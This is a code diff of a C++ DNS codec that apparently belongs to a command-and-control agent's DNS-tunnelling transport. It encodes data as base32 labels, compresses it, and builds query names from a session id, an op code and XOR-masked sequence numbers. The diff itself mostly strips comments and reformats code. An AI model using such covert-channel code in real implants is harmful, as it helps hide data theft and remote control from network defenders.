@@ -5,8 +5,6 @@
 #define MINIZ_NO_STDIO
 #include "miniz.h"
 
-extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);
-
 // Static constant definitions
 const CHAR DnsCodec::kBase32Alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
 
@@ -33,7 +31,6 @@ void DnsCodec::operator delete(void* p) noexcept
     MemFreeLocal(&p, sizeof(DnsCodec));
 }
 
-// Hex conversion
 void DnsCodec::ToHex32(ULONG value, CHAR out[9])
 {
     static const CHAR hex[] = "0123456789abcdef";
@@ -44,15 +41,14 @@ void DnsCodec::ToHex32(ULONG value, CHAR out[9])
     out[8] = '\0';
 }
 
-// Base32 encoding
 ULONG DnsCodec::Base32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize)
 {
     if (!src || !dst || !srcLen || !dstSize)
         return 0;
 
     ULONG bitBuffer = 0;
-    int   bitCount  = 0;
-    ULONG outLen    = 0;
+    int   bitCount = 0;
+    ULONG outLen = 0;
 
     for (ULONG i = 0; i < srcLen; ++i) {
         bitBuffer = (bitBuffer << 8) | src[i];
@@ -78,20 +74,19 @@ ULONG DnsCodec::Base32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dst
     return outLen;
 }
 
-// Base32 decoding
 ULONG DnsCodec::Base32Decode(const CHAR* src, ULONG srcLen, BYTE* dst, ULONG dstSize)
 {
     if (!src || !dst || !srcLen || !dstSize)
         return 0;
 
     ULONG bitBuffer = 0;
-    int   bitCount  = 0;
-    ULONG outLen    = 0;
+    int   bitCount = 0;
+    ULONG outLen = 0;
 
     for (ULONG i = 0; i < srcLen; ++i) {
         CHAR c = src[i];
         int val = -1;
-        
+
         if (c >= 'A' && c <= 'Z')
             val = c - 'A';
         else if (c >= 'a' && c <= 'z')
@@ -103,7 +98,7 @@ ULONG DnsCodec::Base32Decode(const CHAR* src, ULONG srcLen, BYTE* dst, ULONG dst
 
         bitBuffer = (bitBuffer << 5) | val;
         bitCount += 5;
-        
+
         while (bitCount >= 8) {
             bitCount -= 8;
             if (outLen >= dstSize)
@@ -115,7 +110,6 @@ ULONG DnsCodec::Base32Decode(const CHAR* src, ULONG srcLen, BYTE* dst, ULONG dst
     return outLen;
 }
 
-// Base64 decoding
 int DnsCodec::Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
 {
     if (!src || !dst || srcLen <= 0 || dstMax <= 0)
@@ -141,26 +135,23 @@ int DnsCodec::Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
     return j;
 }
 
-// Build DNS query name
-void DnsCodec::BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, 
-                          const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
+void DnsCodec::BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
 {
     CHAR seqHex[9];
     CHAR idxHex[9];
-    
+
     ToHex32(seq ^ kSeqXorMask, seqHex);
     ToHex32(idx ^ kSeqXorMask, idxHex);
 
     const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
-    const CHAR* domPart  = (domain && domain[0]) ? domain : "";
+    const CHAR* domPart = (domain && domain[0]) ? domain : "";
 
     if (domPart[0])
-        _snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
+        ApiWin->snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
     else
-        _snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
+        ApiWin->snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
 }
 
-// Encode DNS name
 int DnsCodec::EncodeName(const CHAR* host, BYTE* buf, int bufSize)
 {
     if (!host || !buf || bufSize <= 1)
@@ -168,16 +159,16 @@ int DnsCodec::EncodeName(const CHAR* host, BYTE* buf, int bufSize)
 
     int len = 0;
     const CHAR* p = host;
-    
+
     while (*p) {
         const CHAR* labelStart = p;
         int labelLen = 0;
-        
+
         while (*p && *p != '.') {
             ++p;
             ++labelLen;
         }
-        
+
         if (labelLen == 0)
             break;
         if (labelLen > (int)kMaxLabelSize)
@@ -193,7 +184,7 @@ int DnsCodec::EncodeName(const CHAR* host, BYTE* buf, int bufSize)
         if (*p == '.')
             ++p;
     }
-    
+
     if (len + 1 > bufSize)
         return -1;
     buf[len++] = 0;
@@ -201,8 +192,7 @@ int DnsCodec::EncodeName(const CHAR* host, BYTE* buf, int bufSize)
 }
 
 // Build data labels for DNS query
-BOOL DnsCodec::BuildDataLabels(const BYTE* src, ULONG srcLen, ULONG labelSize, 
-                               CHAR* out, ULONG outSize)
+BOOL DnsCodec::BuildDataLabels(const BYTE* src, ULONG srcLen, ULONG labelSize, CHAR* out, ULONG outSize)
 {
     if (!src || !srcLen || !out || !labelSize || labelSize > kMaxLabelSize || outSize == 0)
         return FALSE;
@@ -224,9 +214,8 @@ BOOL DnsCodec::BuildDataLabels(const BYTE* src, ULONG srcLen, ULONG labelSize,
         memcpy(out + written, encoded + i, chunk);
         written += chunk;
         i += chunk;
-        if (i < encLen) {
+        if (i < encLen)
             out[written++] = '.';
-        }
     }
     if (written >= outSize)
         return FALSE;
@@ -241,7 +230,7 @@ BOOL DnsCodec::Compress(const BYTE* inBuf, ULONG inLen, BYTE** outBuf, ULONG* ou
         return FALSE;
 
     mz_ulong srcLen = (mz_ulong)inLen;
-    mz_ulong bound  = compressBound(srcLen);
+    mz_ulong bound = compressBound(srcLen);
     if (bound == 0)
         return FALSE;
 
@@ -281,5 +270,3 @@ BOOL DnsCodec::Decompress(const BYTE* inBuf, ULONG inLen, BYTE** outBuf, ULONG e
     *outBuf = tmp;
     return TRUE;
 }
-
-
